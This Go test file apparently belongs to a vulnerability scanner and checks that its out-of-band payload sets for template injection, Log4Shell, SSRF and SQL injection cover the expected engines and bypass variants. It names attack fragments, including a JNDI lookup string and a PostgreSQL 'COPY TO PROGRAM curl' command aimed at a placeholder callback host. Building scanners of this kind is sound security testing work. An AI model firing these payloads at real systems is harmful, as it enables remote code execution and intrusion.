package scanner

import (
	"strings"
	"testing"
)

func TestSSTIOOBPayloadsCoverEngines(t *testing.T) {
	cb := "http://oast.example.com/oob/rcnoob0123456789"
	ps := sstiOOBPayloads(cb)
	if len(ps) < 8 {
		t.Fatalf("expected a broad SSTI set, got %d", len(ps))
	}
	// every payload must embed the callback so a hit correlates.
	for _, p := range ps {
		if !strings.Contains(p, cb) {
			t.Fatalf("SSTI payload missing callback: %q", p)
		}
	}
	// key engine markers must be represented.
	joined := strings.Join(ps, "\n")
	for _, marker := range []string{
		"__globals__",                         // Jinja2
		"__import__",                          // Mako
		"filter('system')",                    // Twig
		"{php}",                               // Smarty
		"child_process",                       // Nunjucks
		"<%=",                                 // ERB
		"freemarker.template.utility.Execute", // Freemarker
		"java.lang.Runtime",                   // SpEL/Java EL
	} {
		if !strings.Contains(joined, marker) {
			t.Errorf("SSTI set missing engine marker %q", marker)
		}
	}
}

func TestLog4ShellParamPayloads(t *testing.T) {
	cb := "oast.example.com:1389/rcnoob0123456789"
	ps := log4ShellParamPayloads(cb)
	if len(ps) < 3 {
		t.Fatalf("expected multiple Log4Shell variants, got %d", len(ps))
	}
	joined := strings.Join(ps, "\n")
	// plain, case-mangled bypass, and RMI variants must all be present.
	for _, want := range []string{"${jndi:ldap://" + cb, "lower:j", "rmi://" + cb, "dns://" + cb} {
		if !strings.Contains(joined, want) {
			t.Errorf("Log4Shell set missing %q", want)
		}
	}
}

func TestSSRFOOBPayloadsBypasses(t *testing.T) {
	host := "oast.example.com"
	cb := "http://" + host + "/oob/rcnoob0123456789"
	ps := ssrfOOBPayloads(cb, host)
	joined := strings.Join(ps, "\n")
	// direct, https, protocol-relative, and fragment-bypass forms.
	for _, want := range []string{cb, "https://" + host + "/oob/", "//" + host + "/oob/", cb + "#"} {
		if !strings.Contains(joined, want) {
			t.Errorf("SSRF set missing variant %q; got %v", want, ps)
		}
	}
}

func TestSQLiOOBIncludesPostgresCopyProgram(t *testing.T) {
	cb := "http://oast.example.com/oob/rcnoob0123456789"
	joined := strings.Join(sqliOOBPayloads(cb, "oast.example.com"), "\n")
	if !strings.Contains(joined, "TO PROGRAM 'curl -s "+cb+"'") {
		t.Fatalf("expected a PostgreSQL COPY ... TO PROGRAM OOB payload")
	}
	// existing Oracle/MSSQL primitives must still be there.
	for _, want := range []string{"UTL_HTTP.REQUEST", "xp_cmdshell", "xp_dirtree", "LOAD_FILE"} {
		if !strings.Contains(joined, want) {
			t.Errorf("SQLi OOB set regressed, missing %q", want)
		}
	}
}
